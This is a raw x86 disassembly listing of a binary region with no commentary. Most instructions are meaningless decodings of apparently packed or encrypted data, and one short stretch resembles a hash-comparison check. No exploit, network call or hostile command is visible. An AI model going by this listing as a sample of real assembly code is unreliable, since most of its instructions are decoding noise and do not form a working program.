  419faf:	push   esp
  419fb0:	jle    0x419f9e
  419fb2:	pop    ebx
  419fb3:	push   ds
  419fb4:	inc    esp
  419fb5:	jnp    0x419fe1
  419fb7:	scas   eax,DWORD PTR es:[edi]
  419fb8:	minps  xmm6,XMMWORD PTR [eax*1-0x4d89177a]
  419fc0:	jnp    0x419f7b
  419fc2:	cmc    
  419fc3:	or     esi,ebp
  419fc5:	ret    0x33f4
  419fc8:	pop    ds
  419fc9:	dec    ecx
  419fca:	mov    esp,0xd5bbf804
  419fcf:	jmp    0xbafe:0x2e00c0bb
  419fd6:	fsub   st,st(5)
  419fd8:	out    dx,al
  419fd9:	and    al,ch
  419fdb:	mov    edx,0x9dea060f
  419fe0:	sti    
  419fe1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419fe2:	jno    0x419f85
  419fe4:	inc    ecx
  419fe5:	repz sub DWORD PTR [ebx],esi
  419fe8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419fe9:	sbb    eax,0x86108390
  419fee:	add    esp,DWORD PTR [esp+edi*8+0x18]
  419ff2:	jle    0x41a039
  419ff4:	std    
  419ff5:	xor    DWORD PTR [ecx+0x2d3c153],0x2f
  419ffc:	addr16 sbb al,0xd1
  419fff:	sbb    al,0x87
  41a001:	call   0xa52708c8
  41a006:	ds in  eax,dx
  41a008:	data16 aaa 
  41a00a:	loope  0x419f9e
  41a00c:	inc    ebx
  41a00d:	into   
  41a00e:	dec    esi
  41a00f:	je     0x41a075
  41a011:	lea    ecx,[edx+0x21494a3f]
  41a017:	cwde   
  41a018:	neg    BYTE PTR [eax+0x471738c0]
  41a01e:	xor    al,0xf0
  41a020:	shr    DWORD PTR [edx],0xf7
  41a023:	add    DWORD PTR [ecx],0x16f5355e
  41a029:	mov    ecx,0xf0a7fad3
  41a02e:	aad    0x48
  41a030:	pop    ds
  41a031:	dec    edx
  41a032:	int    0xc0
  41a034:	push   ecx
  41a035:	push   cs
  41a036:	and    al,0xcf
  41a038:	sbb    DWORD PTR [ecx-0x9],edx
  41a03b:	fild   WORD PTR [ebx+0x3c]
  41a03e:	es adc eax,0x376638c8
  41a044:	ds daa 
  41a046:	mov    ah,0x4c
  41a048:	mov    bh,0xbe
  41a04a:	xlat   BYTE PTR ds:[ebx]
  41a04b:	popf   
  41a04c:	test   ah,bh
  41a04e:	call   0xa2d60939
  41a053:	stos   BYTE PTR es:[edi],al
  41a054:	mov    dl,0x6c
  41a056:	add    al,0x20
  41a058:	xor    ebx,DWORD PTR [ebp+0x35ab304b]
  41a05e:	into   
  41a05f:	inc    ecx
  41a060:	pop    ebx
  41a061:	xchg   edi,eax
  41a062:	xchg   ecx,eax
  41a063:	mov    bh,dh
  41a065:	fidiv  WORD PTR [ebx-0x29b4469b]
  41a06b:	sbb    al,0x6a
  41a06d:	push   ecx
  41a06e:	xor    al,0xaf
  41a070:	or     BYTE PTR [esi],cl
  41a072:	pop    esi
  41a073:	or     eax,0x49c7eadf
  41a078:	lds    esp,FWORD PTR [ecx+0x59]
  41a07b:	shr    BYTE PTR [edx+eiz*2],1
  41a07e:	je     0x41a080
  41a080:	shl    DWORD PTR [edx+ebp*8+0x4d],0xbb
  41a085:	xchg   ecx,eax
  41a086:	mov    esi,0x5ba898e0
  41a08b:	(bad)  
  41a08c:	std    
  41a08d:	(bad)  
  41a08f:	mov    ebx,0xbfb4235c
  41a094:	jnp    0x41a0f0
  41a096:	pop    eax
  41a097:	lock loope 0x41a0e5
  41a09a:	js     0x41a052
  41a09c:	sbb    al,0x54
  41a09e:	clc    
  41a09f:	mov    ebx,0xe65fa916
  41a0a4:	inc    ecx
  41a0a5:	pop    ebp
  41a0a6:	xchg   edx,eax
  41a0a7:	iret   
  41a0a8:	push   edi
  41a0a9:	cmp    bh,bh
  41a0ab:	iret   
  41a0ac:	adc    DWORD PTR [esi+0x7f],0x2debb09d
  41a0b3:	aam    0xc
  41a0b5:	scas   eax,DWORD PTR es:[edi]
  41a0b6:	outs   dx,BYTE PTR ds:[esi]
  41a0b7:	repz mov esi,0xebb63dc1
  41a0bd:	mov    ds:0xfbe4419,al
  41a0c2:	pop    ecx
  41a0c3:	call   0xa494:0xcf0f740e
  41a0ca:	push   ecx
  41a0cb:	xchg   edi,eax
  41a0cc:	sub    esi,DWORD PTR [ecx+0x6f2fefe6]
  41a0d2:	(bad)  
  41a0d3:	jb     0x41a076
  41a0d5:	addr16 out dx,al
  41a0d7:	cmc    
  41a0d8:	xchg   ebp,eax
  41a0d9:	xchg   ebp,eax
  41a0da:	test   DWORD PTR [ebx+0x379a115f],0x747a8415
  41a0e4:	cli    
  41a0e5:	inc    ebp
  41a0e6:	or     al,0xe0
  41a0e8:	sub    al,0x35
  41a0ea:	lods   eax,DWORD PTR ds:[esi]
  41a0eb:	retf   0xdb95
  41a0ee:	fbld   TBYTE PTR [esi]
  41a0f0:	repnz test DWORD PTR [esi],0x85a2c56a
  41a0f7:	sbb    al,bh
  41a0f9:	push   0xffffffb4
  41a0fb:	stos   DWORD PTR es:[edi],eax
  41a0fc:	mov    ds:0xc3021dbe,eax
  41a101:	adc    BYTE PTR cs:[edi-0x2e],bh
  41a105:	jge    0x41a150
  41a107:	loope  0x41a0c0
  41a109:	mov    ch,bh
  41a10b:	sub    eax,0xa3225c49
  41a110:	mov    ecx,0x9180ed76
  41a115:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a116:	jmp    0x6848:0xa126aa56
  41a11d:	in     al,0xae
  41a11f:	jmp    0xbf07:0x14fa64d1
  41a126:	jecxz  0x41a165
  41a128:	mov    ch,0xf1
  41a12a:	and    BYTE PTR [esi],dh
  41a12c:	in     al,dx
  41a12d:	jae    0x41a189
  41a12f:	add    al,0x57
  41a131:	push   cs
  41a132:	add    eax,ebx
  41a134:	fist   DWORD PTR [ebx+esi*8]
  41a137:	mov    ds:0xa12a37d8,eax
  41a13c:	xor    eax,0x4063f146
  41a141:	pop    ss
  41a142:	nop
  41a143:	cmp    eax,0x2200cbc6
  41a148:	add    dh,dl
  41a14a:	mov    DWORD PTR [ebx-0x11],ebx
  41a14d:	mov    ch,0x87
  41a14f:	repz ret 
  41a151:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a152:	and    DWORD PTR [edi],ebp
  41a154:	xor    ebp,ebp
  41a156:	mov    edi,DWORD PTR [edx]
  41a158:	call   0xdbf340fb
  41a15d:	jmp    DWORD PTR [ecx-0x25]
  41a160:	mov    ebx,0xaa0f2f42
  41a165:	push   edx
  41a166:	mov    ebx,0x8b0a088b
  41a16b:	push   ebp
  41a16c:	sub    esi,DWORD PTR [ecx+eax*1-0x2e3b3b85]
  41a173:	mov    edx,0x13173252
  41a178:	xor    eax,0x56c49227
  41a17d:	into   
  41a17e:	setge  BYTE PTR [ebx-0x5e]
  41a182:	outs   dx,BYTE PTR ds:[esi]
  41a183:	xchg   esp,eax
  41a184:	pop    ecx
  41a185:	pushf  
  41a186:	call   0x6a764b1
  41a18b:	cmp    ah,ch
  41a18d:	mov    edi,DWORD PTR [ecx+0x1b900870]
  41a193:	fist   WORD PTR [eax+0x68c699f6]
  41a199:	sbb    edi,DWORD PTR [ebx-0x4790abf]
  41a19f:	mov    bl,0x4c
  41a1a1:	cmp    ch,cl
  41a1a3:	(bad)  
  41a1a4:	scas   eax,DWORD PTR es:[edi]
  41a1a5:	adc    eax,0x408762c8
  41a1aa:	jns    0x41a164
  41a1ac:	xor    ch,bl
  41a1ae:	(bad)  
  41a1af:	(bad)  
  41a1b0:	out    0x53,al
  41a1b2:	xchg   bl,al
  41a1b4:	imul   esi,DWORD PTR [ebp*8-0x54f9c831],0xffffff80
  41a1bc:	inc    esi
  41a1bd:	dec    ebx
  41a1be:	ja     0x41a1c8
  41a1c0:	mov    ah,0xa9
  41a1c2:	(bad)  
  41a1c4:	pop    ds
  41a1c5:	fbstp  TBYTE PTR [edx]
  41a1c7:	lods   al,BYTE PTR ds:[esi]
  41a1c8:	fcomp  DWORD PTR ds:[edx+0x44f1fdb2]
  41a1cf:	in     al,dx
  41a1d0:	mov    edx,0x1c2f4a44
  41a1d5:	xchg   edi,eax
  41a1d6:	sar    BYTE PTR [ebp+0x5a],1
  41a1d9:	(bad)  
  41a1da:	or     ch,BYTE PTR [edi+0x69]
  41a1dd:	pop    es
  41a1de:	cmp    al,0xfe
  41a1e0:	js     0x41a208
  41a1e2:	dec    ebp
  41a1e3:	inc    ecx
  41a1e4:	fadd   QWORD PTR [edi]
  41a1e6:	imul   ebx,DWORD PTR [edx-0xc],0x3
  41a1ea:	xchg   BYTE PTR [edx],ch
  41a1ec:	cs sahf 
  41a1ee:	adc    DWORD PTR [esi-0x24],edx
  41a1f1:	scas   al,BYTE PTR es:[edi]
  41a1f2:	fs push esp
  41a1f4:	stc    
  41a1f5:	adc    eax,0xee2268d9
  41a1fa:	adc    cl,al
  41a1fc:	xor    eax,0xe7e3a0e5
  41a201:	in     al,0x9b
  41a203:	and    al,0x6
  41a205:	push   ss
  41a206:	add    BYTE PTR [ebp+0x3a62a019],0xe3
  41a20d:	mul    DWORD PTR [ecx-0x30]
  41a210:	rol    DWORD PTR [esi+0x139216c6],0xda
  41a217:	sbb    eax,0x2443787d
  41a21c:	enter  0x8485,0xff
  41a220:	xor    bh,BYTE PTR [ebx+0xb32e53f]
  41a226:	sub    DWORD PTR cs:[esp+eax*4],0xbbe3d7f1
  41a22e:	sub    eax,0xf4da4879
  41a233:	test   al,0x63
  41a235:	push   cs
  41a236:	retf   0x7296
  41a239:	xor    ebp,DWORD PTR [edi]
  41a23b:	out    dx,al
  41a23c:	aad    0xfb
  41a23e:	xchg   DWORD PTR [edi-0x62],edx
  41a241:	gs pop esp
  41a243:	ins    DWORD PTR es:[edi],dx
  41a244:	xchg   edi,eax
  41a245:	bnd jl 0x41a2c1
  41a248:	in     al,dx
  41a249:	xlat   BYTE PTR ds:[ebx]
  41a24a:	cmp    ah,BYTE PTR [ebx+eiz*8]
  41a24d:	mov    dh,0xf3
  41a24f:	(bad)  
  41a250:	and    ebp,DWORD PTR [ebx]
  41a252:	mov    BYTE PTR [ebx+0x2a8f3185],cl
  41a258:	mov    ah,0x81
  41a25a:	inc    ebp
  41a25b:	inc    esp
  41a25c:	adc    ebx,DWORD PTR [edi+0x1f874316]
  41a262:	sub    al,0x54
  41a264:	popa   
  41a265:	mov    esp,0x951baad3
  41a26a:	imul   edx,DWORD PTR [ebp+0x209402ec],0xc15928ae
  41a274:	ret    0xe04a
  41a277:	cmp    eax,0x5048439
  41a27c:	ins    DWORD PTR es:[edi],dx
  41a27d:	xchg   edi,eax
  41a27e:	jae    0x41a29d
  41a280:	fadd   DWORD PTR [edi+0x7d855d4f]
  41a286:	jmp    0x1804c069
  41a28b:	mov    DWORD PTR [edi],eax
  41a28d:	mov    cl,0x10
  41a28f:	xor    eax,0xe88377d4
  41a294:	test   DWORD PTR [edi],esi
  41a296:	pop    esi
  41a297:	leave  
  41a298:	mov    edi,0xc9bf42b2
  41a29d:	and    al,dh
  41a29f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2a0:	pop    ds
  41a2a1:	mov    al,ds:0x634c465c
  41a2a6:	adc    al,0x24
  41a2a8:	cmp    BYTE PTR [ebp+eax*8+0x8],dh
  41a2ac:	inc    esp
  41a2ad:	dec    ebx
  41a2ae:	aas    
  41a2af:	aam    0xd9
  41a2b1:	imul   ebx,edx,0xffffffa3
  41a2b4:	or     dh,al
  41a2b6:	jmp    0x90091103
  41a2bb:	adc    al,0xc1
  41a2bd:	jbe    0x41a24a
  41a2bf:	mov    ecx,ecx
  41a2c1:	cmp    eax,0x8b8af3ab
  41a2c6:	mov    dl,0x91
  41a2c8:	inc    ecx
  41a2c9:	nop
  41a2ca:	add    DWORD PTR [ecx+0x64874870],ebp
  41a2d0:	jns    0x41a34b
  41a2d2:	jne    0x41a340
  41a2d4:	mov    cl,0x85
  41a2d6:	clc    
  41a2d7:	arpl   ax,ax
  41a2d9:	xchg   edx,eax
  41a2da:	or     ch,BYTE PTR [edx-0x81ffed]
  41a2e0:	outs   dx,BYTE PTR ds:[esi]
  41a2e1:	jge    0x41a309
  41a2e3:	jo     0x41a285
  41a2e5:	cmp    dh,BYTE PTR [ecx+eiz*1]
  41a2e8:	sbb    eax,0x542e7706
  41a2ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2ee:	or     BYTE PTR [eax-0x39],ch
  41a2f1:	and    eax,esp
  41a2f3:	icebp  
  41a2f4:	out    dx,al
  41a2f5:	and    BYTE PTR [ecx],dh
  41a2f7:	in     al,0xbc
  41a2f9:	scas   eax,DWORD PTR es:[edi]
  41a2fa:	jnp    0x41a2af
  41a2fc:	dec    ebx
  41a2fd:	add    BYTE PTR [ebp-0x1b],0xef
  41a301:	jg     0x41a2ed
  41a303:	int    0x20
  41a305:	addr16 jno 0x41a29d
  41a308:	cmp    BYTE PTR [ecx-0x45],bh
  41a30b:	push   ebp
  41a30c:	jmp    0x5293:0xf574492c
  41a313:	hlt    
  41a314:	ret    
  41a315:	ret    0x6ff0
  41a318:	add    DWORD PTR [edx+0x2a5a5e8c],0x50
  41a31f:	std    
  41a320:	jl     0x41a327
  41a322:	jg     0x41a2aa
  41a324:	shr    DWORD PTR [edx-0x717e2c3c],0xc0
  41a32b:	fdiv   DWORD PTR [edx]
  41a32d:	xchg   BYTE PTR [edi],bh
  41a32f:	jmp    0x9ccc1447
  41a334:	lods   eax,DWORD PTR ds:[esi]
  41a335:	or     DWORD PTR [esi+edi*1+0x5d],edx
  41a339:	push   ds
  41a33a:	(bad)  
  41a33b:	mov    al,ds:0x2c197a20
  41a340:	pop    ebp
  41a341:	or     edx,DWORD PTR [ecx+0x71]
  41a344:	cmp    esp,DWORD PTR [edx+edx*4+0x397ea455]
  41a34b:	jecxz  0x41a31c
  41a34d:	dec    esp
  41a34e:	push   cs
  41a34f:	and    BYTE PTR [ebx+0x2cad86f0],0xb
  41a356:	pushf  
  41a357:	sub    al,0xa
  41a359:	popa   
  41a35a:	mov    ebx,0x43215178
  41a35f:	pop    es
  41a360:	pop    ss
  41a361:	jl     0x41a36f
  41a363:	hlt    
  41a364:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  41a366:	dec    ecx
  41a367:	cmp    BYTE PTR [esi-0x6cdbc7c7],al
  41a36d:	or     ah,BYTE PTR [eax+0x15e908b0]
  41a373:	mov    ebx,0x471e6700
  41a378:	xor    ecx,DWORD PTR [esi-0x19f421a3]
  41a37e:	dec    esi
  41a37f:	div    BYTE PTR ds:[esi-0x69003937]
  41a386:	xor    al,0x8b
  41a388:	rcl    DWORD PTR [ecx],cl
  41a38a:	jecxz  0x41a36d
  41a38c:	rcl    BYTE PTR [ebx-0x51],cl
  41a38f:	scas   eax,DWORD PTR es:[edi]
  41a390:	mov    dl,ch
  41a392:	fdiv   st,st(6)
  41a394:	jecxz  0x41a380
  41a396:	mov    ebx,0x674c43c7
  41a39b:	ret    0x8dfb
  41a39e:	clc    
  41a39f:	scas   al,BYTE PTR es:[edi]
  41a3a0:	in     eax,0x72
  41a3a2:	pop    ebp
  41a3a3:	jo     0x41a3e7
  41a3a5:	and    ebp,DWORD PTR [esi+0x1e]
  41a3a8:	dec    edx
  41a3a9:	adc    DWORD PTR [esi],0x9bbe3d39
  41a3af:	sub    DWORD PTR [edx-0x43],ecx
  41a3b2:	int3   
  41a3b3:	rol    BYTE PTR [ebp+eax*1-0x2],0xf0
  41a3b8:	cmp    DWORD PTR [eax-0x7d],ebp
  41a3bb:	das    
  41a3bc:	mov    al,ds:0x97eb0294
  41a3c1:	enter  0xa02d,0xfa
  41a3c5:	xchg   edi,eax
  41a3c6:	and    ch,ch
  41a3c8:	add    DWORD PTR [eax-0x2f],ebp
  41a3cb:	mov    WORD PTR [ebp+0x570f6af3],?
  41a3d1:	or     DWORD PTR [edx],esp
  41a3d3:	inc    ebx
  41a3d4:	call   DWORD PTR [esi+0x59685084]
  41a3da:	fsubr  QWORD PTR [edi]
  41a3dc:	js     0x41a3ce
  41a3de:	(bad)  
  41a3df:	hlt    
  41a3e0:	pop    ecx
  41a3e1:	push   0x3342690a
  41a3e6:	push   ebx
  41a3e7:	test   eax,0xd7b823e7
  41a3ec:	sahf   
  41a3ed:	mov    ds:0x2e79b03,eax
  41a3f2:	cmp    eax,0xa8fc589
  41a3f7:	mov    al,0xec
  41a3f9:	mov    bh,0x85
  41a3fb:	retf   
  41a3fc:	ret    0xd209
  41a3ff:	lds    ebx,FWORD PTR [edi]
  41a401:	adc    cl,cl
  41a403:	adc    al,0xaa
  41a405:	rol    bh,0x69
  41a408:	jle    0x41a450
  41a40a:	xchg   esi,eax
  41a40b:	xchg   edi,eax
  41a40c:	dec    DWORD PTR [eax]
  41a40e:	adc    ch,BYTE PTR [ebp-0x41a7e571]
  41a414:	outs   dx,BYTE PTR ds:[esi]
  41a416:	push   ds
  41a417:	pop    eax
  41a418:	inc    edx
  41a419:	adc    edx,DWORD PTR [esi+edi*4]
  41a41c:	push   esp
  41a41d:	leave  
  41a41e:	loop   0x41a478
  41a420:	xchg   ecx,eax
  41a421:	xchg   ebp,eax
  41a422:	popf   
  41a423:	add    BYTE PTR [ebx+0x2d],cl
  41a426:	or     bl,al
  41a428:	call   0x7a2babb3
  41a42d:	scas   eax,DWORD PTR es:[edi]
  41a42e:	adc    al,0x52
  41a430:	jbe    0x41a492
  41a432:	xchg   ecx,eax
  41a433:	cmp    eax,0xb6eb66e
  41a438:	outs   dx,BYTE PTR ds:[esi]
  41a439:	jl     0x41a498
  41a43b:	cmc    
  41a43c:	mov    edi,ecx
  41a43e:	std    
  41a43f:	cld    
  41a440:	stos   DWORD PTR es:[edi],eax
  41a441:	mov    ds:0x8a03e61e,eax
  41a446:	je     0x41a4be
  41a448:	pushf  
  41a449:	mov    ah,0xc3
  41a44b:	pop    ecx
  41a44c:	jle    0x41a4cd
  41a44e:	mov    dl,0xd6
  41a450:	pop    esp
  41a451:	sti    
  41a452:	popa   
  41a453:	into   
  41a454:	mov    ds,WORD PTR [bx+si]
  41a457:	sub    al,0x3e
  41a459:	jle    0x41a459
  41a45b:	push   edx
  41a45c:	mov    eax,0x390d5293
  41a461:	pop    ss
  41a462:	cmp    ah,BYTE PTR [ebx]
  41a464:	jmp    0xc8a:0x7379cbe2
  41a46b:	mov    bl,BYTE PTR [edi+ebx*4]
  41a46e:	jo     0x41a439
  41a470:	fcmovnb st,st(2)
  41a472:	and    BYTE PTR [edi+0x69d2fe13],bl
  41a478:	aaa    
  41a479:	fcomp  QWORD PTR [eax-0x1c3f5b2e]
  41a47f:	fild   DWORD PTR [ebp-0x79]
  41a482:	stos   BYTE PTR es:[edi],al
  41a483:	cmc    
  41a484:	xlat   BYTE PTR ds:[ebx]
  41a485:	inc    edi
  41a486:	gs iret 
  41a488:	mov    bh,0xbb
  41a48a:	pop    edx
  41a48b:	add    al,0x81
  41a48d:	rcr    esp,1
  41a48f:	sbb    ah,cl
  41a491:	xchg   ecx,eax
  41a493:	adc    dl,BYTE PTR [esp+edi*4-0xd]
  41a497:	int    0xc3
  41a499:	xchg   BYTE PTR [eax+0x74899517],al
  41a49f:	inc    ebx
  41a4a0:	and    DWORD PTR [ebp+0x6cace242],esp
  41a4a6:	scas   eax,DWORD PTR es:[edi]
  41a4a7:	jmp    0x41a509
  41a4a9:	adc    ebp,ecx
  41a4ab:	iret   
  41a4ac:	push   0x85e6b046
  41a4b1:	int3   
  41a4b2:	xor    edx,ebp
  41a4b4:	xor    esi,edx
  41a4b6:	add    eax,ecx
  41a4b8:	add    esi,ecx
  41a4ba:	imul   eax,esi
  41a4bd:	jmp    0x41c8af
  41a4c2:	mov    eax,DWORD PTR [ebp+0xc]
  41a4c5:	mov    eax,DWORD PTR [eax+0x78]
  41a4c8:	mov    DWORD PTR [ebp+0xc],eax
  41a4cb:	mov    eax,DWORD PTR [ebp-0x4]
  41a4ce:	mov    esi,DWORD PTR [ebp-0x8]
  41a4d1:	xor    eax,edx
  41a4d3:	xor    esi,edx
  41a4d5:	add    eax,ecx
  41a4d7:	add    esi,ecx
  41a4d9:	imul   eax,esi
  41a4dc:	mov    esi,DWORD PTR [ebp+0xc]
  41a4df:	cmp    esi,eax
  41a4e1:	mov    eax,DWORD PTR [ebp-0x4]
  41a4e4:	je     0x4180fd
  41a4ea:	xor    eax,edx
  41a4ec:	jmp    0x41c89e
  41a4f1:	aaa    
  41a4f2:	dec    eax
  41a4f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4f4:	sbb    DWORD PTR [edi-0x67],esp
  41a4f7:	xchg   DWORD PTR [eax],ebp
  41a4f9:	and    bl,BYTE PTR [ecx+eiz*8+0x35fcbeab]
  41a500:	xlat   BYTE PTR ds:[ebx]
  41a501:	dec    eax
  41a502:	add    BYTE PTR [ecx+0x62],ah
  41a505:	int    0x5f
  41a507:	bound  esp,QWORD PTR [edx+0x75]
  41a50a:	jno    0x41a577
  41a50c:	retf   0x91dc
  41a50f:	dec    edx
  41a510:	int3   
  41a511:	popa   
  41a512:	adc    DWORD PTR [edx-0x7ebd840],edx
  41a518:	outs   dx,DWORD PTR ds:[esi]
  41a519:	push   ebp
  41a51a:	add    bl,BYTE PTR [ebx]
  41a51c:	sbb    dl,0x7
  41a51f:	add    eax,0x341c5c14
  41a524:	push   eax
  41a525:	in     eax,dx
  41a526:	dec    ebp
  41a527:	xchg   ebx,eax
  41a528:	in     eax,0xc3
  41a52a:	retf   0xbaa
  41a52d:	adc    esi,DWORD PTR [eax+0x52]
  41a530:	jo     0x41a555
  41a532:	pop    ebx
  41a533:	xlat   BYTE PTR ds:[ebx]
  41a534:	lods   al,BYTE PTR ds:[esi]
  41a535:	loop   0x41a4ff
  41a537:	push   es
  41a538:	cmc    
  41a539:	enter  0x28e6,0xb5
  41a53d:	dec    esi
  41a53e:	pop    ss
  41a53f:	fs clc 
  41a541:	sub    ah,ah
  41a543:	sub    ch,dl
  41a545:	les    eax,FWORD PTR [edi-0x28]
  41a548:	int    0x35
  41a54a:	ds mov ebx,0x980a8166
  41a550:	retf   0xb52f
  41a553:	or     esp,DWORD PTR [edx]
  41a555:	inc    edi
  41a556:	sbb    eax,0xdab01f94
  41a55b:	fisttp DWORD PTR [esi+0x34]
  41a55e:	mov    ds:0x67945400,al
  41a563:	mov    ecx,0xee60d2f2
  41a568:	cmc    
  41a569:	gs jns 0x41a4ed
  41a56c:	xchg   esi,eax
  41a56d:	xchg   ebp,eax
  41a56e:	xchg   ch,dh
  41a570:	sub    BYTE PTR [edi-0x2],al
  41a573:	pushf  
  41a574:	fwait
  41a575:	iret   
  41a576:	sbb    ebx,DWORD PTR [ecx]
  41a578:	and    al,0x9c
  41a57a:	inc    edx
  41a57b:	ja     0x41a55f
  41a57d:	mov    edi,0x8d178e21
  41a582:	sub    ah,BYTE PTR [esi+ebx*4]
  41a585:	add    DWORD PTR [ecx],0xcfcd0065
  41a58b:	call   0xeb3b:0xbcbf1f46
  41a592:	leave  
  41a593:	or     ebx,DWORD PTR [ebx]
  41a595:	icebp  
  41a596:	data16 das 
  41a598:	pop    ebp
  41a599:	jbe    0x41a541
  41a59b:	out    dx,eax
  41a59c:	dec    ebx
  41a59d:	and    eax,0xf2484238
  41a5a2:	pop    ss
  41a5a3:	repnz mov edx,0x77557d0
  41a5a9:	scas   eax,DWORD PTR es:[edi]
  41a5aa:	ins    DWORD PTR es:[edi],dx
  41a5ab:	push   ecx
  41a5ac:	in     eax,0x98
  41a5ae:	daa    
  41a5af:	retf   
  41a5b0:	stos   DWORD PTR es:[edi],eax
  41a5b1:	pusha  
  41a5b2:	cwde   
  41a5b3:	cwde   
  41a5b4:	push   ss
  41a5b5:	in     eax,0xae
  41a5b7:	xchg   ecx,eax
  41a5b8:	jae    0x41a55e
  41a5ba:	xlat   BYTE PTR ds:[ebx]
  41a5bb:	jl     0x41a567
  41a5bd:	retf   0xd8b6
  41a5c0:	mov    esi,DWORD PTR [edi+0x242fe727]
  41a5c6:	xchg   ebx,eax
  41a5c7:	retf   
  41a5c8:	ficom  WORD PTR [esi-0x9b54e67]
  41a5ce:	daa    
  41a5cf:	out    0xf,eax
  41a5d1:	enter  0x9fa7,0x63
  41a5d5:	sbb    ebp,DWORD PTR [ecx+0x36b5bfe8]
  41a5db:	sub    cl,BYTE PTR [edi]
  41a5dd:	mov    dh,0x34
  41a5df:	daa    
  41a5e0:	enter  0xc54e,0xd8
  41a5e4:	jbe    0x41a5fe
  41a5e6:	xor    eax,0xaec1cd1
  41a5eb:	jle    0x41a5c5
  41a5ed:	xchg   BYTE PTR [edi+esi*1+0x47],ch
  41a5f1:	rcr    DWORD PTR [eax],1
  41a5f3:	dec    eax
  41a5f4:	add    BYTE PTR [ebx],0x66
  41a5f7:	adc    eax,0x21e5e73
  41a5fc:	xchg   esi,eax
  41a5fd:	or     cl,dh
  41a5ff:	ds xchg esp,eax
  41a601:	push   0x4d12f867
  41a606:	mov    DWORD PTR [eax],edi
  41a608:	ins    BYTE PTR es:[edi],dx
  41a609:	mov    WORD PTR [edx],es
  41a60b:	inc    edi
  41a60c:	shl    BYTE PTR [edx],cl
  41a60e:	jno    0x41a5d7
  41a610:	fcomp  DWORD PTR [edx+eiz*4+0x65baacd9]
  41a617:	(bad)
  41a61a:	lock sbb DWORD PTR [edi+0x43e79b9],ebp
  41a621:	cli    
  41a622:	mov    WORD PTR [edi],es
  41a624:	bound  edx,QWORD PTR [ebp-0x6d05d785]
  41a62a:	fsub   QWORD PTR [ecx+0x6ea4691c]
  41a630:	cmp    DWORD PTR [ecx+0x50e6dbbb],esp
  41a636:	xchg   edx,eax
  41a637:	add    DWORD PTR [eax+0x4f],esi
  41a63a:	sub    ecx,DWORD PTR [edi+0x3c6d60ca]
  41a640:	adc    bl,BYTE PTR [eax+0x4d]
  41a643:	lock out dx,eax
  41a645:	jae    0x41a6a8
  41a647:	lea    ecx,[esi]
  41a649:	jmp    0xda9fbd50
  41a64e:	popf   
  41a64f:	rcl    eax,0xe8
  41a652:	push   es
  41a653:	cld    
  41a654:	mov    ds:0x22226c48,eax
  41a659:	cmp    BYTE PTR [eax+0x77],ah
  41a65c:	fucomi st,st(0)
  41a65e:	adc    ecx,DWORD PTR [edi]
  41a660:	and    BYTE PTR [ebp-0x5e7de51a],0xe7
  41a667:	(bad)  
  41a669:	std    
  41a66a:	push   0x1c
  41a66c:	rcl    BYTE PTR [ecx+0x78],1
  41a66f:	mov    esp,ebp
  41a671:	and    ah,BYTE PTR [edx-0xb]
  41a674:	jo     0x41a6a5
  41a676:	fnstsw WORD PTR [esi-0x1006053d]
  41a67c:	xor    BYTE PTR [esi-0x751170d7],0xe6
  41a683:	retf   0x899e
  41a686:	push   ds
  41a687:	out    0x6e,al
  41a689:	outs   dx,DWORD PTR ds:[esi]
  41a68a:	dec    esp
  41a68b:	and    al,0xa7
  41a68d:	(bad)  [edi+0x6e]
  41a690:	mov    ds:0xaef73ef1,eax
  41a695:	pop    edx
  41a696:	xor    ecx,esp
  41a698:	mov    ds,WORD PTR ds:0x4bce3130
  41a69e:	xor    DWORD PTR [eax-0x13e6b88],0x13
  41a6a5:	inc    ecx
  41a6a6:	outs   dx,BYTE PTR ds:[esi]
  41a6a7:	sub    eax,0x6dc5b1a5
  41a6ac:	in     al,0x36
  41a6ae:	jnp    0x41a705
  41a6b0:	add    bh,dh
  41a6b2:	push   ecx
  41a6b3:	imul   ebx,esi,0x5a3f1581
  41a6b9:	mov    dh,0x74
  41a6bb:	fisubr DWORD PTR [esi]
  41a6bd:	mov    al,0xcd
  41a6bf:	shr    al,0xec
  41a6c2:	aad    0x99
  41a6c4:	push   ds
  41a6c5:	pop    edi
  41a6c6:	add    eax,0x7cff1563
  41a6cb:	and    dh,dh
  41a6cd:	ins    DWORD PTR es:[edi],dx
  41a6ce:	mov    WORD PTR [ebp+0x4063b9e7],?
  41a6d4:	fisubr WORD PTR [edi+0x57fcb23e]
  41a6da:	fistp  WORD PTR [ebx]
  41a6dc:	popa   
  41a6dd:	mov    dl,0x84
  41a6df:	push   edx
  41a6e0:	xchg   DWORD PTR [esi+eax*1],edi
  41a6e3:	jg     0x41a6df
  41a6e5:	rcl    BYTE PTR [eax],1
  41a6e7:	pop    ds
  41a6e8:	btc    DWORD PTR [edx-0x6a],esi
  41a6ec:	mov    ebx,0xdda8ede6
  41a6f1:	mov    ecx,0xea76ec3b
  41a6f6:	jmp    0x25ac:0x9b7b1c18
  41a6fd:	aad    0x88
  41a6ff:	ror    DWORD PTR [ecx-0x1],1
  41a702:	adc    ebp,DWORD PTR [esi+0x51fca39]
  41a708:	mov    ecx,0xc418afc2
  41a70d:	sbb    BYTE PTR [ebx+edi*4+0x64bf641c],ah
  41a714:	and    BYTE PTR [esi],0x8f
  41a717:	mov    eax,0x3487679a
  41a71c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a71d:	std    
  41a71e:	mov    cl,0x3f
  41a720:	push   ds
  41a721:	ret    
  41a722:	sub    dl,dh
  41a724:	dec    ebx
  41a725:	sbb    DWORD PTR [ebx+ecx*2],ebp
  41a728:	sbb    eax,0xdb96ac9d
  41a72d:	inc    esp
  41a72e:	or     al,BYTE PTR [ebx]
  41a730:	sar    BYTE PTR [eax+edi*8-0x812c7c4],1
  41a737:	shl    DWORD PTR [edx-0x8],0x92
  41a73b:	(bad)  
  41a73c:	and    cl,al
  41a73e:	in     eax,0x45
  41a740:	ja     0x41a7ac
  41a742:	cld    
  41a743:	and    esi,DWORD PTR [ebx-0x4680ddf0]
  41a749:	cmp    eax,0xa253e744
